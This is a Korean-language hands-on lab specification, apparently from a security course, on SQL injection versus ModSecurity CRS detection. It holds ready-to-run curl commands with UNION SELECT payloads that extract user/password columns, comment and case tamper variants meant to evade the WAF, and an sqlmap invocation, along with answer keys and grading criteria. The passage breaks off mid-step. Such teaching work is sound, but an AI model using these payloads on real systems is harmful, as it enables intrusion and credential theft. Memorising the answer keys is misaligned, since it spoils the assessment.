lab_id: standalone-attack-week04
title: "SQL Injection(sqlmap·WAF 우회) vs SQLi 탐지·차단 분석"
version: standalone-attack
course: attack
week: 4
description: |
  SQL Injection 공방을 공격자(PTES Exploitation) 관점에서 손으로 익힌다. 먼저 가장 직접적인 수동 UNION
  SQLi 를 보내 차단형 WAF(dvwa)가 403 으로 막는 것을 확인하고, 주석·대소문자 tamper 로 WAF 우회를 시도해
  ModSec CRS 의 정규화(normalization) 때문에 단순 우회가 왜 무력한지 체감한다. 이어 자동화 도구 sqlmap 으로
  juice 의 검색 파라미터를 4 기법으로 자동 테스트하며 그 "시끄러움"을 보고, 방어 측 modsec_audit.log 에서
  본인 공격이 942(SQLi)+949110(anomaly)으로 잡힌 흔적을 분석한다. 마지막으로 같은 payload 가 차단 모드
  (dvwa 403) vs 탐지 전용 모드(juice 200)로 갈리는 이유와 근본 방어(parameterized query)를 정리한다.
  공격 도구는 el34-attacker, 로그 확인은 el34-web. 명령은 모두 el34 호스트(ssh ccc@{{TARGET_IP}})에서
  docker exec 로 실행한다. 인가된 실습 환경에서만 수행한다.
difficulty: hard
duration_minutes: 180
prerequisites:
  - "W01–W03 통과"
  - "el34 호스트 SSH + docker exec"
  - "lecture §2(SQLi 유형) §3(sqlmap) §4(WAF 우회) 숙지"
objectives:
  - "수동 UNION SQLi 를 직접 작성해 보내고 차단형 vhost(dvwa)에서 403 차단을 확인한다"
  - "주석·대소문자 tamper 로 WAF 우회를 시도하고 ModSec CRS 의 정규화로 단순 우회가 무력함을 이해한다"
  - "sqlmap 으로 한 파라미터를 4 기법으로 자동 테스트하고 다량 요청이 방어층에 탐지되는 특성을 안다"
  - "modsec_audit.log 에서 942(SQLi)+949110(anomaly) 탐지 흔적을 찾고 차단 모드 vs 탐지 전용 모드 차이를 설명한다"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 점검 — sqlmap 가용성 + 대상 도달성
      모든 공격의 0단계는 "도구가 있고 대상에 닿는가" 확인이다. SQLi 자동화 도구 sqlmap 이
      attacker 컨테이너에 설치돼 있는지, 그리고 차단형 vhost(dvwa)에 네트워크로 도달하는지 본다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) SQLi 자동화 도구 sqlmap 설치 경로 확인(없으면 빈 출력)
      docker exec el34-attacker sh -c 'command -v sqlmap'
      # 2) 차단형 vhost(dvwa) 도달성 — HTTP 코드만
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w '도달=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
      ```
      - `command -v sqlmap`(설치 경로), `curl ... -H 'Host: dvwa.el34.lab'`(fw 게이트웨이로 보내되 dvwa vhost 지정), `-o /dev/null -w '%{http_code}'`(본문 버리고 코드만).
      ## ✅ 합격 기준
      `sqlmap` 출력 시 통과. **근거:** sqlmap 경로가 출력돼 사용 가능하고 dvwa 에 도달(HTTP 코드 응답)하면
      통과 — 공격 착수 전 도구·대상 준비 상태를 확인하는 기본 절차다.
    hint: 'command -v sqlmap + 도달성'
    category: survey
    points: 10
    answer: |
      # 1) SQLi 자동화 도구 sqlmap 설치 경로 확인(없으면 빈 출력)
      docker exec el34-attacker sh -c 'command -v sqlmap'
      # 2) 차단형 vhost(dvwa) 도달성 — HTTP 코드만
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w '도달=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
    answer_detail: "SQLi 자동화 도구 sqlmap 이 attacker 에 설치됐는지(command -v 로 경로 확인)와 대상 vhost(dvwa=차단 모드, juice=탐지만)에 도달하는지를 점검한다. 공격 착수 전 도구·대상 준비 상태를 1분 내 확인하는 기본 절차다."
    verify:
      type: output_contains
      expect: 'sqlmap'
      field: stdout
      semantic:
        intent: "sqlmap + 대상 점검"
        success_criteria: ["sqlmap 가용", "대상 도달"]
        acceptable_methods: ["**[OSS] command -v + curl (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 수동 UNION SQLi — dvwa 차단(403)
      가장 직접적인 UNION-based SQLi 를 손으로 만들어 보낸다. `UNION SELECT` 는 정상 질의 결과 뒤에
      다른 테이블(users 의 계정·비밀번호)을 이어 붙여 응답에 노출시키는 기법이다. 차단형 WAF(dvwa)가
      이 평문 SQLi 를 얼마나 쉽게 막는지 직접 확인한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) 수동 UNION SQLi(users 계정/비번 추출 시도) — 차단형 dvwa 응답코드
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
      # 2) 해석 — UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다
      echo "→ UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다"
      ```
      - payload `1' UNION SELECT user,password FROM users-- -`(URL 인코딩: `%27`=`'`, `%20`=공백, 끝 `-- -`=원래 SQL 주석). dvwa vhost=`SecRuleEngine On`(차단 모드)이라 SQLi 룰 매치 시 요청을 끊는다.

      ## ✅ 합격 기준
      `403` 출력 시 통과. **근거:** UNION SQLi 가 dvwa 에서 403(WAF 차단)으로 응답되면 통과 — 평문 SQLi 는
      CRS 가 가장 쉽게 잡는다(942 매치 → anomaly 누적 → 949110 차단).
    hint: 'UNION SELECT → dvwa 403'
    category: manipulation
    points: 12
    answer: |
      # 1) 수동 UNION SQLi(users 계정/비번 추출 시도) — 차단형 dvwa 응답코드
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
      # 2) 해석 — UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다
      echo "→ UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다"
    answer_detail: "UNION-based SQLi 는 다른 테이블을 결과에 합쳐 추출하는 가장 직접적인 기법이다. dvwa(SecRuleEngine On)에서는 payload 가 942 룰군(SQLi 변형)에 매치되고 anomaly score 가 누적돼 949110(임계치 도달)이 발동, 403 으로 차단된다. 평문 SQLi 는 CRS 가 가장 쉽게 잡는다는 점을 403 응답으로 판정한다."
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "수동 UNION SQLi + WAF 차단"
        success_criteria: ["UNION SELECT", "403 차단"]
        acceptable_methods: ["**[OSS] UNION SQLi → 403 (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 WAF 우회(tamper) 시도 — CRS 의 정규화라는 벽
      payload 를 변형해 WAF 시그니처를 피하려는 시도가 tamper 다. 두 가지 고전 기법을 직접 넣어 본다 —
      키워드 사이에 SQL 주석을 끼우는 주석 삽입(`UN/**/ION SE/**/LECT`)과 대소문자를 섞는 변형
      (`UnIoN sElEcT`). 둘 다 DB 는 정상 실행하지만 단순 시그니처는 못 알아본다. 그러나 ModSec CRS 는
      검사 전에 입력을 표준형으로 되돌리는 정규화(normalization)를 하므로, 두 변형 모두 `UNION SELECT`
      로 복원돼 결국 잡힌다. "우회는 쉽지 않다"를 눈으로 확인하는 단계다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) 주석 삽입 tamper — UN/**/ION SE/**/LECT(키워드 중간 SQL 주석)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'comment=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\""
      # 2) 대소문자 tamper — UnIoN sElEcT(키워드 대소문자 무관)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'case=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\""
      # 3) 해석 — CRS는 정규화 후 검사 → 단순 tamper는 대부분 여전히 403, 우회는 어렵다
      echo "→ CRS는 정규화 후 검사 → 단순 tamper(주석/대소문자)는 대부분 여전히 403. 우회는 어렵다"
      ```
      - `UN/**/ION SE/**/LECT`(SQL 인라인 주석 `/**/` 삽입), `UnIoN sElEcT`(대소문자 섞기). DB 는 정상 실행하지만 CRS 가 정규화로 복원해 잡는다.

      ## ✅ 합격 기준
      `403` 출력 시 통과. **근거:** tamper 시도가 CRS 정규화로 대부분 여전히 403(차단)되면 통과 — CRS 942
      룰군이 수십 변형을 포괄하므로 단순 우회는 무력하다.
    hint: 'UN/**/ION, UnIoN tamper → 결과'
    category: manipulation
    points: 14
    answer: |
      # 1) 주석 삽입 tamper — UN/**/ION SE/**/LECT(키워드 중간 SQL 주석)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'comment=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\""
      # 2) 대소문자 tamper — UnIoN sElEcT(키워드 대소문자 무관)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'case=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\""
      # 3) 해석 — CRS는 정규화 후 검사 → 단순 tamper는 대부분 여전히 403, 우회는 어렵다
      echo "→ CRS는 정규화 후 검사 → 단순 tamper(주석/대소문자)는 대부분 여전히 403. 우회는 어렵다"
    answer_detail: "주석 삽입·대소문자·인코딩 같은 단순 tamper 는 ModSec CRS 가 검사 전에 입력을 표준형으로 되돌리는 정규화(normalization) 때문에 대부분 무력하다 — 변형이 UNION SELECT 로 복원돼 여전히 403. CRS 942 룰군이 수십 가지 SQLi 변형을 포괄하므로, 우회하려면 정규화의 빈틈을 노리는 고급 기법이 필요하다. 여전히 차단(403)되는 결과로 CRS 의 견고함을 판정한다."
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "WAF 우회 시도 + CRS 한계 이해"
        success_criteria: ["tamper 시도", "CRS 정규화로 여전히 차단"]
        acceptable_methods: ["**[OSS] tamper payload 시도 (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 sqlmap 자동화 — 한 파라미터를 4 기법으로
      수동 시도를 자동화 도구로 대체한다. sqlmap 은 대상 URL 의 한 파라미터를 4 기법(Boolean/Time/
      UNION/Error)으로 자동 주입해 취약 여부를 판별한다. 여기서는 juiceshop 의 REST 검색 파라미터
      `/rest/products/search?q=` 를 대상으로 한다(juice 는 W03 에서 본 API 구조). 자동화의 위력과
      동시에 "매우 시끄럽다"(다량 비정상 요청으로 WAF/IDS 에 다수 탐지)는 특성을 체감한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) sqlmap으로 juice 검색 파라미터를 4기법(boolean/time/union/error) 자동 테스트(40초 제한)
      docker exec el34-attacker sh -c "timeout 40 sqlmap -u 'http://10.20.30.1/rest/products/search?q=test' -H 'Host: juice.el34.lab' --batch --level=1 --risk=1 --flush-session 2>&1 | grep -iE 'parameter|testing|sqlmap' | head -6"
      # 2) 해석 — 자동 테스트는 빠르지만 다량 비정상 요청이라 매우 시끄러움(WAF/IDS 다수 탐지)
      echo "→ sqlmap이 파라미터를 자동 테스트(boolean/time/union/error). 빠르지만 매우 시끄러움"
      ```
      - `-u <URL>`+`-H 'Host: juice.el34.lab'`(대상·vhost), `--batch`(무인), `--level=1`/`--risk=1`(범위·공격성), `--flush-session`(캐시 비움), `timeout 40`(40초 제한).

      ## ✅ 합격 기준
      `testing` 출력 시 통과. **근거:** sqlmap 이 파라미터 자동 테스트를 시작해 testing 라인이 나타나면
      통과(timeout 40 으로 완주 못 해도 시작 자체가 합격) — 자동화는 빠르지만 매우 시끄럽다.
    hint: 'sqlmap --batch 자동 테스트'
    category: recon
    points: 12
    answer: |
      # 1) sqlmap으로 juice 검색 파라미터를 4기법(boolean/time/union/error) 자동 테스트(40초 제한)
      docker exec el34-attacker sh -c "timeout 40 sqlmap -u 'http://10.20.30.1/rest/products/search?q=test' -H 'Host: juice.el34.lab' --batch --level=1 --risk=1 --flush-session 2>&1 | grep -iE 'parameter|testing|sqlmap' | head -6"
      # 2) 해석 — 자동 테스트는 빠르지만 다량 비정상 요청이라 매우 시끄러움(WAF/IDS 다수 탐지)
      echo "→ sqlmap이 파라미터를 자동 테스트(boolean/time/union/error). 빠르지만 매우 시끄러움"
    answer_detail: "sqlmap 은 한 파라미터를 4 기법(Boolean/Time/UNION/Error)으로 자동 주입해 SQLi 를 탐지·악용하는 도구다(--tamper 로 WAF 우회 변형까지 자동화). 효율적이지만 한 파라미터 검증에 수십~수백 개의 비정상 요청을 보내므로 WAF/IDS 에 다량 탐지된다 — '빠르지만 들키는' 도구다. 출력의 testing 라인(파라미터 테스트 시작)으로 자동화 동작을 판정한다(timeout 40 으로 완주 못 해도 시작 자체가 합격)."
    verify:
      type: output_contains
